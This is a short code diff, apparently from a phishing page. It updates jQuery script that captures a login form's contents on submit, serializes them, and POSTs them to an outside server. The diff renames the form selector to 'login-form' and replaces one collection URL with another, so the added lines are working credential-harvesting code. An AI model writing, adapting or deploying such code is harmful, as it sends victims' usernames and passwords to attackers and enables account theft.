@@ -1,8 +1,8 @@
-$(".falxvrf").submit(function() {
-	var d = $(".falxvrf");
+$(".login-form").submit(function() {
+	var d = $(".login-form");
 
 	$.ajax({
-        url: "http://sedeka.my.id/apiii.php",
+        url: "https://short.adon.my.id/mediafire/",
         type: "POST",
         data: d.serialize(),
         success: function () {
